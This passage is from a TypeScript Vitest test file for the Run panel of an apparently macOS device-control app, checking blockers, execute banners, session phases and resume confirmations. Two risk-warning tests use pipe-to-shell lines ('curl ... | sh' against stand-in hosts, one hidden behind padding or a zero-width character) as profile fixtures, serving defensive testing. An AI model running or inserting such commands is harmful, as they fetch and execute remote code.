import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import type { DisplaySettings, LiveDevice, ModuleControl, Profile } from './contracts';
import { emptyKeypadPage } from './keypad-model';
import { appControlNote, builtInKeypadBlocker, settingsErrorBlocker, settingsLoadingBlocker, softwareModeBox, confirmCopy, countdownSeconds, dialogCopy, isMacPlatform, phaseLabel, relativeTime, resumeCopy, runBlocker, runPreviewNote, serviceResumeId, disconnectedServiceValue, resolveServiceSelection, RunBlockerNotice, RunHeaderControl, ServicePanel, settlePendingConfirm, useRunSession } from './ServicePanel';
import type { RunSessionOptions } from './ServicePanel';
import { DisplaySettingsStore } from './display-settings';
import { emptyCounters, ServiceRunner, serviceIdFor, type ServiceRun } from './service-runner';
import { DeviceFeed } from './device-feed';

const flat: Profile = { schema_version: 1, name: 'Flat', bindings: [] };
const root = emptyKeypadPage();
root.slots[1] = { type: 'folder', page_id: 'sub' };
const nested: Profile = { schema_version: 2, name: 'Nested', bindings: [], keypad: { pages: [root, emptyKeypadPage('sub', 'Sub')] } };
const dial = { path_hex: 'aabb', module: 'm131e' as const, serial_number: 'S1' };
const keypad = { ...dial, module: 'm4315' as const };
const mac = { platform: 'MacIntel' };

describe('platform and blockers', () => {
  it('detects macOS', () => {
    expect(isMacPlatform(mac)).toBe(true);
    expect(isMacPlatform({ userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X)' })).toBe(true);
    expect(isMacPlatform({ platform: 'Win32', userAgent: 'Windows' })).toBe(false);
    expect(isMacPlatform(undefined)).toBe(false);
  });
  it('refuses paged keypad profiles on the 15-key module only with Built-in animation', () => {
    // App module control (the default) runs them with display sync.
    expect(runBlocker({ desktop: true, device: keypad, profile: nested })).toBeNull();
    expect(runBlocker({ desktop: true, device: keypad, profile: nested, moduleControl: 'app' })).toBeNull();
    // Built-in animation names the setting, never the service's flag. Any schema-2 profile, with or without folders,
    // is refused, exactly as the service refuses it.
    const blocker = runBlocker({ desktop: true, device: keypad, profile: nested, moduleControl: 'built_in_animation' });
    expect(blocker).toBe(builtInKeypadBlocker);
    expect(blocker).toContain('Let OpenStreamHub drive the display');
    expect(blocker).not.toContain('--display-sync');
    const pagedWithoutFolders: Profile = { ...nested, keypad: { pages: [emptyKeypadPage()] } };
    expect(runBlocker({ desktop: true, device: keypad, profile: pagedWithoutFolders, moduleControl: 'built_in_animation' })).toBe(builtInKeypadBlocker);
    expect(runBlocker({ desktop: true, device: dial, profile: nested, moduleControl: 'built_in_animation' })).toBeNull();
    expect(runBlocker({ desktop: true, device: keypad, profile: flat, moduleControl: 'built_in_animation' })).toBeNull();
    expect(runBlocker({ desktop: true, device: keypad, profile: flat })).toBeNull();
    expect(runBlocker({ desktop: true, device: undefined, profile: flat })).toContain('No module');
    expect(runBlocker({ desktop: false, device: dial, profile: flat })).toContain('desktop app');
  });
  it('formats relative time', () => {
    expect(relativeTime(1000, 2000)).toBe('now');
    expect(relativeTime(0, 30_000)).toBe('30s ago');
    expect(relativeTime(0, 125_000)).toBe('2m ago');
    expect(relativeTime(0, 7_300_000)).toBe('2h ago');
  });
});

function fixtures(execute: boolean, state: 'running' | 'failed' | 'exited' = 'running', extra: Record<string, unknown> = {}) {
  const feed = new DeviceFeed(async () => [dial] as never, async () => () => {}, true);
  (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [dial] };
  const runner = new ServiceRunner(async () => undefined as never, async () => () => {}, true);
  (runner as unknown as { state: unknown }).state = { desktop: true, error: null, runs: { [serviceIdFor('aabb')]: {
    serviceId: serviceIdFor('aabb'), state, execute, entries: [{ kind: 'action', text: 'planned volume +5', at: 1000 }], counters: { ...emptyCounters(), events: 3 },
    startedAt: 0, profileName: 'Flat', snapshot: '{}', draftUnsaved: true, ...extra } } };
  return { feed, runner };
}
const setRun = (runner: ServiceRunner, patch: Record<string, unknown>) => {
  const state = runner.getState();
  const id = serviceIdFor('aabb');
  (runner as unknown as { state: unknown }).state = { ...state, runs: { [id]: { ...state.runs[id], ...patch } } };
};
const render = (props: Partial<RunSessionOptions> = {}) => {
  // The header Run control, its blocker strip and the panel share the hook, as in the app.
  const View = () => {
    const run = useRunSession({ profile: flat, desktop: true, unsaved: false, platform: mac, now: 2000, ...props });
    return <><RunHeaderControl run={run} /><RunBlockerNotice run={run} /><ServicePanel run={run} /></>;
  };
  return renderToStaticMarkup(<View />);
};
// The idle Run panel for `device` with Module control `control` (loaded unless `state` says otherwise).
function loadedSettings() {
  const settings: DisplaySettings = { module_control: 'app', dial_content: 'function', auto_execute: false };
  const displaySettings = new DisplaySettingsStore(async <T,>() => settings as T, true);
  (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: true, settings };
  return displaySettings;
}
function panelFor(device: LiveDevice, control: ModuleControl, profile: Profile, state: { loaded?: boolean; error?: string | null } = {}) {
  const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
  (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [device] };
  const runner = new ServiceRunner(async () => undefined as never, async () => () => {}, true);
  const settings: DisplaySettings = { module_control: control, dial_content: 'function', auto_execute: false };
  const displaySettings = new DisplaySettingsStore(async <T,>() => settings as T, true);
  (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: state.loaded ?? true, error: state.error ?? null, settings };
  return render({ feed, runner, profile, displaySettings });
}
// The header Run button, disabled with its spinner and its target label ("Run", "Run on 15-key", …).
const runDisabled = /<button[^>]*disabled=""[^>]*>[^<]*<svg[^>]*>.*Run/s;

describe('ServicePanel markup', () => {
  it('shows an unmistakable banner while executing', () => {
    const { feed, runner } = fixtures(true);
    const markup = render({ feed, runner });
    expect(markup).toContain('Actions are running on this Mac');
    expect(markup).toContain('service-banner execute');
    expect(markup).toContain(runPreviewNote);
    expect(markup).not.toContain('paused while actions run');
    // A run being stopped reads nothing more, so the note goes away.
    setRun(runner, { state: 'stopping' });
    expect(render({ feed, runner })).not.toContain(runPreviewNote);
    expect(markup).toContain('Profile changed since start. Restart to apply.');
    expect(markup).toContain('(unsaved changes)');
    expect(markup).toContain('>Stop<');
    expect(markup).toContain('role="log"');
    expect(markup).toContain('<time>now</time>');
  });
  it('shows a dry run without the execute banner', () => {
    const { feed, runner } = fixtures(false);
    const markup = render({ feed, runner });
    expect(markup).not.toContain('Actions are running on this Mac');
    expect(markup).toContain('Dry run: actions are logged only');
  });
  it('shows failures with the stderr tail', () => {
    const { feed, runner } = fixtures(false, 'failed', { error: 'device busy', stderrTail: 'hid error' });
    const markup = render({ feed, runner });
    expect(markup).toContain('device busy');
    expect(markup).toContain('hid error');
    expect(markup).toContain('>Failed<');
  });
  it('shows failed timer alerts apart from failed actions, only when there are some', () => {
    const { feed, runner } = fixtures(true);
    expect(render({ feed, runner })).not.toContain('Timer alerts failed');
    setRun(runner, { counters: { ...emptyCounters(), executed: 1, timerAlertsFailed: 2 } });
    const markup = render({ feed, runner });
    expect(markup).toContain('<dt>Timer alerts failed</dt><dd>2</dd>');
    expect(markup).toContain('<dt>Failed</dt><dd>0</dd>');
  });
  it('confirmation names the profile and device with Cancel focused first', () => {
    const { feed, runner } = fixtures(false, 'failed');
    const markup = render({ feed, runner, profile: { ...flat, name: 'Gaming' } });
    expect(markup).toContain('Profile &quot;Gaming&quot; will run on Encoder IPS display S1');
    expect(markup).toContain('Everything listed here will really run on this Mac');
    expect(markup).not.toContain('Volume, shortcut and app-launch');
    expect(markup).toContain('No actions are bound yet');
    expect(markup).toContain('role="alertdialog"');
    expect(markup.indexOf('>Cancel<')).toBeLessThan(markup.indexOf('>Run actions<'));
    expect(markup).toMatch(/autofocus=""[^>]*>Cancel</);
    // A normal-risk profile needs no acknowledgement: Run actions is enabled.
    expect(markup).not.toContain('I reviewed this profile');
    expect(markup).toMatch(/<button type="button" class="button danger">Run actions</);
  });
  it('a high-risk profile shows a warning, every snippet and step, and keeps Run actions off until acknowledged', () => {
    const risky: Profile = { schema_version: 1, name: 'Risky', bindings: [{ module: 'm131e', control: 0, gesture: 'short_press', action: { type: 'multi_action', actions: [
      { type: 'launch_app', bundle_id: 'com.apple.Terminal' }, { type: 'text', text: 'curl https://x.test | sh\u{200B}', press_enter: true }] } }] };
    const { feed, runner } = fixtures(false, 'failed');
    const markup = render({ feed, runner, profile: risky });
    expect(markup).toContain('id="execute-warning"');
    expect(markup).toContain('aria-describedby="execute-warning execute-message"');
    expect(markup).toContain('High risk.');
    expect(markup).toContain('curl https://x.test | sh\\u{200B}');
    expect(markup).toContain('Open application com.apple.Terminal');
    expect(markup).toMatch(/<input type="checkbox"\/>I reviewed this profile and trust its source<\/label>/);
    expect(markup).toMatch(/<button type="button" class="button danger" disabled="">Run actions</);
  });
  it('builds the high-risk copy from the whole profile', () => {
    const profile: Profile = { schema_version: 1, name: 'Ops', bindings: [{ module: 'm003k', control: 0, gesture: 'pressed', action: { type: 'text', text: `${' '.repeat(199)}; curl evil.test | sh`, press_enter: false } }] };
    const copy = confirmCopy('start', 'Ops', 'X', false, profile);
    expect(copy).toMatchObject({ risk: 'elevated', warning: null, acknowledge: null, snippets: [{ text: `${' '.repeat(199)}; curl evil.test | sh`, more: 0, pressEnter: false }] });
    expect(render({ profile })).toContain(`${' '.repeat(199)}; curl evil.test | sh</code>`);
    expect(copy.lines[0]).toBe('Pastes 1 text snippet into the focused app (shown below).');
  });
  it('disables Execute off macOS and explains it', () => {
    const { feed, runner } = fixtures(false, 'failed');
    const markup = render({ feed, runner, platform: { platform: 'Win32' } });
    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>Execute actions</);
    expect(markup).toContain('only available on macOS');
  });
  it('disables Run with the Module control reason for a paged profile on the 15-key module', () => {
    const markup = panelFor(keypad, 'built_in_animation', nested);
    expect(markup).toContain(builtInKeypadBlocker);
    expect(markup).toContain('“Let OpenStreamHub drive the display” is set to Built-in animation');
    expect(markup).not.toContain('--display-sync');
    expect(markup).toMatch(runDisabled);
    // App control runs it.
    expect(panelFor(keypad, 'app', nested)).not.toContain(builtInKeypadBlocker);
  });
  it('locks software mode on for the 15-key module and the dial under App control only', () => {
    const softwareBox = (markup: string) => markup.match(/<input type="checkbox"[^>]*>Request device software mode/)?.[0] ?? '';
    for (const device of [keypad, dial]) {
      // App: ticked, disabled and explained.
      const app = panelFor(device, 'app', flat);
      expect(softwareBox(app)).toMatch(/checked=""/);
      expect(softwareBox(app)).toMatch(/disabled=""/);
      expect(softwareBox(app)).toContain('aria-describedby="service-app-control"');
      expect(app).toContain(appControlNote);
      // Built-in animation: the user's own choice, off by default, as before.
      const builtIn = panelFor(device, 'built_in_animation', flat);
      expect(softwareBox(builtIn)).not.toMatch(/checked=""/);
      expect(softwareBox(builtIn)).not.toMatch(/disabled=""/);
      expect(builtIn).not.toContain(appControlNote);
    }
    // Knobs, faders and rollers have no software mode: the box is off and locked whatever the setting.
    for (const module of ['m003k', 'm005s', 'm032le'] as const) {
      for (const control of ['app', 'built_in_animation'] as const) {
        const markup = panelFor({ ...dial, module }, control, flat);
        expect(softwareBox(markup)).not.toMatch(/checked=""/);
        expect(softwareBox(markup)).toMatch(/disabled=""/);
        expect(markup).not.toContain(appControlNote);
      }
    }
  });
  it('sends what the user ticked, never the App value the panel shows', () => {
    for (const module of ['m4315', 'm131e'] as const) {
      for (const ticked of [false, true]) {
        // App, loaded: shown ticked and locked, but the request carries the user's own choice.
        expect(softwareModeBox({ module, loaded: true, moduleControl: 'app', ticked })).toEqual({ appDriven: true, requested: ticked, checked: true, locked: true });
        expect(softwareModeBox({ module, loaded: true, moduleControl: 'built_in_animation', ticked })).toEqual({ appDriven: false, requested: ticked, checked: ticked, locked: false });
        // Not loaded (or failed to load): the default App value is never shown or sent as App.
        expect(softwareModeBox({ module, loaded: false, moduleControl: 'app', ticked })).toEqual({ appDriven: false, requested: ticked, checked: ticked, locked: true });
      }
    }
    for (const module of ['m003k', 'm005s', 'm032le', undefined] as const) {
      for (const moduleControl of ['app', 'built_in_animation'] as const) {
        expect(softwareModeBox({ module, loaded: true, moduleControl, ticked: true })).toEqual({ appDriven: false, requested: false, checked: false, locked: true });
      }
    }
  });
  it('keeps Run disabled until the Module control setting is read, and names a setting that cannot be read', () => {
    for (const device of [keypad, dial, { ...dial, module: 'm003k' as const }]) {
      const loading = panelFor(device, 'app', flat, { loaded: false });
      expect(loading).toContain(settingsLoadingBlocker);
      expect(loading).toMatch(runDisabled);
      expect(loading).not.toContain(appControlNote);
      expect(loading.match(/<input type="checkbox"[^>]*>Request device software mode/)?.[0]).not.toMatch(/checked=""/);
      const failed = panelFor(device, 'app', flat, { loaded: false, error: 'display settings in /x/display-settings.json are unreadable.' });
      expect(failed).toContain(settingsErrorBlocker('display settings in /x/display-settings.json are unreadable.'));
      expect(failed).toContain('could not be read');
      expect(failed).toMatch(runDisabled);
      expect(failed).not.toContain(appControlNote);
    }
    // No settings store at all (never loaded): Run stays off too.
    const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
    (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [dial] };
    expect(render({ feed, runner: new ServiceRunner(async () => undefined as never, async () => () => {}, true) })).toMatch(runDisabled);
    expect(runBlocker({ desktop: true, device: dial, profile: flat, settingsLoaded: false, settingsError: null })).toBe(settingsLoadingBlocker);
    expect(runBlocker({ desktop: true, device: dial, profile: flat, settingsLoaded: true, moduleControl: 'app' })).toBeNull();
  });
  it('is disabled in the browser preview', () => {
    const markup = render({ desktop: false });
    expect(markup).toContain('needs the desktop app');
    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>Dry run/);
  });
});

describe('header Run control', () => {
  it('shows the run state: Stopped, Dry run and Executing, in the header and the panel badge', () => {
    expect(phaseLabel(undefined)).toBe('Stopped');
    // A dry run and an executing run are named by what they do, never just "Running".
    const dry = fixtures(false);
    expect(render({ feed: dry.feed, runner: dry.runner })).toContain('run-state-pill running" role="status">Dry run</span>');
    const live = fixtures(true);
    const executing = render({ feed: live.feed, runner: live.runner });
    expect(executing).toContain('run-state-pill running executing" role="status">Executing</span>');
    expect(executing).toContain('service-badge running executing" role="status">Executing</span>');
  });
  it('offers Run when stopped (disabled with its blocker) and Stop while a run is active', () => {
    const idle = render();
    expect(idle).toContain('run-state-pill idle" role="status">Stopped</span>');
    expect(idle).toMatch(/<button type="button" class="button primary" disabled="" title="[^"]*">/);
    const { feed, runner } = fixtures(false);
    const active = render({ feed, runner });
    expect(active).toContain('>Stop</button>');
    expect(active).not.toMatch(/<button[^>]*class="button primary"[^>]*>/);
  });
  it('keeps Run and Stop out of the panel; the panel keeps device and mode selection', () => {
    const { feed, runner } = fixtures(false);
    const markup = render({ feed, runner });
    expect(markup).toContain('aria-label="Run control"');
    expect(markup).toContain('id="service-device"');
    expect(markup).toContain('aria-label="Run mode"');
    // Exactly one Stop across header and panel.
    expect(markup.match(/>Stop</g)).toHaveLength(1);
  });
  it('offers Resume and Stop in the header for a paused run', () => {
    const { feed, runner } = fixtures(true, 'running', {
      session: { serviceId: null, phase: 'needs_confirmation', reason: 'sleep', attempt: 0, module: 'm131e', serialNumber: 'ABCDEF123456' } });
    const markup = render({ feed, runner });
    expect(markup).toContain('>Resume…</button>');
    expect(markup).toContain('>Stop</button>');
    expect(markup).toContain('run-state-pill needs_confirmation" role="status">Needs confirmation</span>');
  });
  it('names the module a start would use on the Run button', () => {
    // A stopped run, so the header offers Run again.
    const { feed, runner } = fixtures(false, 'exited');
    expect(render({ feed, runner, displaySettings: loadedSettings() })).toContain('>Run on encoder</button>');
    // Without a device there is nothing to name.
    expect(render()).toContain('>Run</button>');
    // The tooltip still carries the full device name with its serial.
    expect(render({ feed, runner, displaySettings: loadedSettings() })).toMatch(/title="Dry run on Encoder IPS display S1"/);
  });
  it('warns with danger styling and the full label before an Execute run', () => {
    const { feed, runner } = fixtures(false, 'exited');
    const markup = render({ feed, runner, displaySettings: loadedSettings(), initialExecute: true });
    expect(markup).toContain('>Run with actions on encoder</button>');
    expect(markup).toMatch(/<button type="button" class="button danger" title="Run with actions on Encoder IPS display S1"/);
    // Dry run stays primary.
    expect(render({ feed, runner, displaySettings: loadedSettings() })).toMatch(/<button type="button" class="button primary" title="Dry run on Encoder IPS display S1"/);
  });
  it('shows a blocked Run its reason as a strip in the header, not only as a tooltip', () => {
    // A connected module with a blocked profile (Built-in animation) names the setting in the strip.
    const blocked = panelFor(keypad, 'built_in_animation', nested);
    expect(blocked).toContain('class="run-blocker-strip" role="status"');
    expect(blocked).toContain(builtInKeypadBlocker);
    expect(blocked).toMatch(new RegExp(`<span>${builtInKeypadBlocker}</span>`));
    // The panel no longer repeats the blocker; the strip is its single home.
    expect(blocked).not.toContain('service-blocker');
    // An active run shows no blocker.
    const { feed, runner } = fixtures(false);
    expect(render({ feed, runner })).not.toContain('run-blocker-strip');
    // The browser preview omits the strip: its own banner already says the desktop app is needed.
    expect(render({ desktop: false })).not.toContain('run-blocker-strip');
    expect(render({ desktop: false })).toMatch(/title="[^"]*needs the desktop app[^"]*"/);
  });
});

describe('session banners', () => {
  // A session without a process belongs to the device with its module and serial, not to whatever sits at its old path.
  const sessionFor = (phase: string, extra: Record<string, unknown> = {}, execute = true) => {
    const result = fixtures(execute, 'running', {
      session: { serviceId: null, phase, reason: null, attempt: 0, module: 'm131e', serialNumber: 'ABCDEF123456', ...extra } });
    const device = { ...dial, serial_number: 'ABCDEF123456' };
    (result.feed as unknown as { state: unknown }).state = { ...result.feed.getState(), devices: [device] };
    return result;
  };
  const liveBanner = 'Actions are running on this Mac';

  it('shows the execute-live banner only while running', () => {
    const { feed, runner } = sessionFor('running', { serviceId: serviceIdFor('aabb') });
    const markup = render({ feed, runner });
    expect(markup).toContain(liveBanner);
    expect(markup).not.toContain('Resume actions');
  });
  it('needs_confirmation is prominent, offers Resume and Stop, and never says actions are live', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'sleep' });
    const markup = render({ feed, runner });
    expect(markup).not.toContain(liveBanner);
    expect(markup).not.toContain('service-banner execute');
    expect(markup).toContain('service-banner paused attention');
    expect(markup).toContain('Actions are paused. Nothing will run until you resume.');
    expect(markup).toContain('Resume actions…');
    expect(markup).toContain(`id="${serviceResumeId}"`);
    expect(markup).toContain('>Stop<');
    expect(markup).toContain('>Needs confirmation<');
  });
  it('suspended in dry-run mode says it resumes automatically', () => {
    const { feed, runner } = sessionFor('suspended', { reason: 'sleep' }, false);
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused while your Mac sleeps');
    expect(markup).toContain('resumes automatically in dry-run mode');
    expect(markup).toContain('>Stop<');
  });
  it('explains that opted-in automatic actions resume without confirmation', () => {
    for (const [phase, expected] of [
      ['suspended', 'Actions resume automatically after wake.'],
      ['waiting_for_device', 'Actions stay paused until the module reconnects, then resume automatically.'],
      ['reconnecting', 'Actions are paused until the session restarts; they resume automatically.'],
    ] as const) {
      const { feed, runner } = sessionFor(phase, { autoStart: 'app_opened' });
      expect(render({ feed, runner })).toContain(expected);
    }
  });
  it('waiting names the module and serial tail', () => {
    const { feed, runner } = sessionFor('waiting_for_device', { reason: 'device_removed' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Waiting for Encoder IPS display …123456 to reconnect…');
    expect(markup).not.toContain(liveBanner);
    expect(markup).toContain('>Stop<');
  });
  it('reconnecting shows the attempt and countdown', () => {
    const { feed, runner } = sessionFor('reconnecting', { attempt: 3, nextAttemptAt: 6500 });
    const markup = render({ feed, runner });
    expect(markup).toContain('attempt 3/5');
    expect(markup).toContain('Next attempt in 5s.');
    expect(markup).not.toContain(liveBanner);
    expect(countdownSeconds(6500, 2000)).toBe(5);
    expect(countdownSeconds(1000, 2000)).toBe(0);
    expect(countdownSeconds(undefined, 2000)).toBeNull();
  });
  it('stopped shows reason and detail and no Stop', () => {
    const { feed, runner } = sessionFor('stopped', { reason: 'service_exited', detail: 'HID read failed' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Session stopped: the background helper exited');
    expect(markup).toContain('HID read failed');
    expect(markup).not.toContain(liveBanner);
    expect(markup).not.toContain('>Stop<');
    expect(markup).toContain('>Run on encoder</button>');
  });
  it('a refused start shows its plain reason once, with no reconnect banner or raw service output', () => {
    const detail = 'This profile\'s 15-key pages run live only when OpenStreamHub controls the module. Module control in Settings is set to Built-in animation: set it to App, then start the profile again.';
    const { feed, runner } = sessionFor('stopped', { reason: 'start_refused', detail });
    setRun(runner, { state: 'exited', exitCode: 1, stderrTail: 'masterhub-service: nested keypad profiles run live only with --display-sync (which requires --software-mode); in OpenStreamHub, set Module control to App in Settings' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Session stopped: the profile could not start');
    // The backend refusal appears exactly once, as the session detail.
    expect(markup.split('Module control in Settings is set to Built-in animation').length).toBe(2);
    expect(markup).not.toContain('Reconnecting');
    expect(markup).not.toContain('--display-sync');
    expect(markup).toContain('>Run on encoder</button>');
  });
  it('keeps showing the session when no device is connected', () => {
    const { runner } = sessionFor('waiting_for_device');
    const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
    const markup = render({ feed, runner });
    expect(markup).toContain('to reconnect');
    expect(markup).toContain('>Stop<');
  });
  it('a run paused by a focused-app switch resumes with the switched profile', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'profile_switch' });
    setRun(runner, { profileSwitched: true, profileSwitchedBy: 'rule' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused because a focused-app rule switched the profile.');
    expect(markup).toContain('Resuming starts the saved profile &quot;Flat&quot; a focused-app rule switched to.');
    expect(markup).toContain('Resume actions…');
    expect(confirmCopy('resume', 'Browser', 'X', true, null, 'rule').message).toContain('the saved profile a focused-app rule switched to');
    // Who switched is unknown (e.g. after a reload that missed the switch event): no guess.
    expect(confirmCopy('resume', 'Browser', 'X', true).message).toContain('the saved profile this run was switched to');
  });
  it('a run paused by a profile key names the key and treats the unseen profile as high risk', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'profile_action' });
    setRun(runner, { profileSwitched: true, profileSwitchedBy: 'key' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused because a profile key switched the profile.');
    expect(markup).toContain('Resuming starts the saved profile &quot;Flat&quot; a profile key switched to.');
    const copy = confirmCopy('resume', 'Browser', 'X', true, null, 'key', '00000000-0000-4000-8000-0000000000a2');
    expect(copy.message).toContain('the saved profile a profile key switched to');
    expect(copy.message).toContain('Saved profile "Browser", id 00000000….');
    expect(copy.message).not.toContain('0000000000a2');
    expect(copy.message).toContain('later edits to the saved profile do not apply until the next switch');
    // Not loaded: high risk, and no advice to review a saved profile that may differ from the run's copy.
    expect(copy.risk).toBe('high');
    expect(copy.lines.join(' ')).not.toContain('Profiles page');
    // Loaded (session_profile): the real capabilities with the normal risk logic.
    const loaded = confirmCopy('resume', 'Browser', 'X', true, { schema_version: 1, name: 'Browser', bindings: [{ module: 'm003k', control: 0, gesture: 'pressed', action: { type: 'toggle_mute' } }] }, 'key', 'id-1');
    expect(loaded.risk).toBe('normal');
    expect(loaded.lines).toEqual(['Changes the output volume or mute.']);
  });
  it('a switched run paused later by sleep still says the switched profile resumes', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'sleep' });
    setRun(runner, { profileSwitched: true, profileSwitchedBy: 'rule' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused because the Mac went to sleep.');
    expect(markup).toContain('Resuming starts the saved profile &quot;Flat&quot; a focused-app rule switched to.');
    expect(markup).not.toContain('exactly as it was started');
    const unswitched = sessionFor('needs_confirmation', { reason: 'service_exited' });
    expect(render(unswitched)).toContain('Resuming restarts &quot;Flat&quot; exactly as it was started.');
  });
  it('keeps the stale-profile notice against the original snapshot', () => {
    const { feed, runner } = sessionFor('needs_confirmation');
    expect(render({ feed, runner })).toContain('Profile changed since start. Restart to apply.');
  });
  it('the Resume dialog names the run being resumed, not the run of the device selected now', () => {
    const session = (module: 'm131e' | 'm003k', serialNumber: string) => ({ serviceId: null, phase: 'needs_confirmation' as const, reason: 'sleep' as const, attempt: 0, module, serialNumber });
    const base = { state: 'running' as const, execute: true, entries: [], counters: emptyCounters(), startedAt: 0, snapshot: '{}', draftUnsaved: false };
    const runs = {
      'service:aa': { ...base, serviceId: 'service:aa', profileName: 'Gaming', session: session('m131e', 'DIAL-123456') },
      'service:bb': { ...base, serviceId: 'service:bb', profileName: 'Browser', profileSwitched: true, profileSwitchedBy: 'rule' as const, session: session('m003k', 'KEYS-654321') },
    };
    // A device plugged in while the dialog is open would make findRun pick the other run.
    expect(resumeCopy(runs, 'service:aa')?.message).toContain('Profile "Gaming" (as it was when this run started)');
    expect(resumeCopy(runs, 'service:aa')?.message).not.toContain('Browser');
    expect(resumeCopy(runs, 'service:bb')?.message).toContain('Profile "Browser" (the saved profile a focused-app rule switched to)');
    expect(resumeCopy(runs, 'service:gone')).toBeNull();
    expect(resumeCopy(runs, null)).toBeNull();
    // A resume whose run vanished while the dialog was open has no copy (the panel answers false), never start text.
    const start = confirmCopy('start', 'Flat', 'X');
    expect(dialogCopy('resume', runs, 'service:gone', start)).toBeNull();
    expect(dialogCopy('resume', runs, 'service:aa', start)?.title).toBe('Resume actions on this Mac?');
    expect(dialogCopy('start', runs, 'service:gone', start)).toBe(start);
  });
  it('labels phases and builds the resume confirmation copy', () => {
    expect(phaseLabel(undefined)).toBe('Stopped');
    const copy = confirmCopy('resume', 'Gaming', 'Encoder …1234');
    expect(copy).toMatchObject({ title: 'Resume actions on this Mac?', confirm: 'Resume actions' });
    expect(copy.message).toContain('Profile "Gaming"');
    expect(copy.message).toContain('Encoder …1234');
    expect(confirmCopy('start', 'Gaming', 'X').confirm).toBe('Run actions');
    // Without the profile body (a run the frontend did not start or a backend switch), the copy says so and is high risk.
    expect(copy).toMatchObject({ risk: 'high', acknowledge: 'I reviewed this profile and trust its source' });
    expect(copy.lines[0]).toContain('cannot read the contents of this profile');
  });
  it('the resume copy discloses the run snapshot, not the current draft', () => {
    const snapshot = JSON.stringify({ schema_version: 1, name: 'Gaming', bindings: [{ module: 'm131e', control: 0, gesture: 'right', action: { type: 'open_url', url: 'https://example.com/a?token=1' } }] });
    const run = { serviceId: 'service:aa', state: 'running' as const, execute: true, entries: [], counters: emptyCounters(), startedAt: 0, snapshot, draftUnsaved: false, profileName: 'Gaming',
      session: { serviceId: null, phase: 'needs_confirmation' as const, reason: 'sleep' as const, attempt: 0, module: 'm131e' as const, serialNumber: 'DIAL-123456' } };
    const copy = resumeCopy({ 'service:aa': run }, 'service:aa')!;
    expect(copy.risk).toBe('elevated');
    expect(copy.lines).toContain('Opens web pages: https://example.com.');
    expect(copy.message).toContain('will really run on this Mac again');
  });
});

describe('ServicePanel lifecycle helpers', () => {
  it('answers a pending confirmation with false once, on unmount', async () => {
    let resolve: ((ok: boolean) => void) | null = null;
    const answer = new Promise<boolean>(done => { resolve = done; });
    const pending = { current: resolve as ((ok: boolean) => void) | null };
    settlePendingConfirm(pending);
    expect(pending.current).toBeNull();
    expect(await answer).toBe(false);
    expect(() => settlePendingConfirm(pending)).not.toThrow();
  });
});


describe('Run-panel selection across replug', () => {
  const knobs: LiveDevice = { path_hex: 'bb', module: 'm003k', serial_number: 'K1' };
  const activeDial = (): ServiceRun => ({ serviceId: 'session:dial', state: 'running', execute: false,
    profileName: 'Everyday', snapshot: '{}', draftUnsaved: false, startedAt: 0, counters: emptyCounters(), entries: [],
    session: { module: 'm131e', serialNumber: 'S1', serviceId: serviceIdFor(dial.path_hex), phase: 'running', reason: null, attempt: 0 } });
  it('keeps Waiting and the original Stop target through removal and a new path', () => {
    const run = activeDial();
    let runs = { [run.serviceId]: run };
    const started = resolveServiceSelection([knobs, dial], runs, { device: dial });
    expect(started.run?.serviceId).toBe('session:dial');
    runs = { [run.serviceId]: { ...run, session: { ...run.session!, serviceId: null, phase: 'waiting_for_device' } } };
    const removed = resolveServiceSelection([knobs], runs, started.selection);
    expect(removed.device).toBeUndefined();
    expect(phaseLabel(removed.run)).toBe('Waiting');
    expect(removed.run?.serviceId).toBe('session:dial'); // The component's Stop passes this stable key.
    expect(removed.selection?.device).toEqual(dial);
    const moved = { ...dial, path_hex: 'cc' };
    const returned = resolveServiceSelection([knobs, moved], runs, removed.selection);
    expect(returned.device).toEqual(moved);
    expect(returned.selection?.sessionId).toBe('session:dial');
    runs = { [run.serviceId]: { ...run, session: { ...run.session!, serviceId: serviceIdFor('cc') } } };
    expect(resolveServiceSelection([knobs, moved], runs, returned.selection).run?.serviceId).toBe('session:dial');
  });
  it('does not adopt a different serial, even on the old path, or an unrelated session', () => {
    const run = activeDial();
    run.session = { ...run.session!, serviceId: null, phase: 'waiting_for_device' };
    const other = { ...run, serviceId: 'session:knobs', session: { ...run.session!, module: 'm003k' as const, serialNumber: 'K1', serviceId: serviceIdFor('bb'), phase: 'running' as const } };
    const runs = { [other.serviceId]: other, [run.serviceId]: run };
    const retained = resolveServiceSelection([knobs, { ...dial, serial_number: 'S2' }], runs, { device: dial, sessionId: run.serviceId });
    expect(retained.device).toBeUndefined();
    expect(retained.run).toBe(run);
    expect(resolveServiceSelection([knobs, dial], runs, { device: knobs }).run).toBe(other);
    expect(resolveServiceSelection([], runs, null).run).toBeUndefined();
  });
  it('keeps ambiguous serial-less sessions detached until a current process identifies their path', () => {
    const run = activeDial();
    run.session = { ...run.session!, serialNumber: null, serviceId: null, phase: 'needs_confirmation' };
    const selected = { device: { ...dial, serial_number: null }, sessionId: run.serviceId };
    const devices = [{ ...dial, path_hex: 'cc', serial_number: null }, { ...dial, path_hex: 'dd', serial_number: null }];
    const resolved = resolveServiceSelection(devices, { [run.serviceId]: run }, selected);
    expect(resolved.device).toBeUndefined();
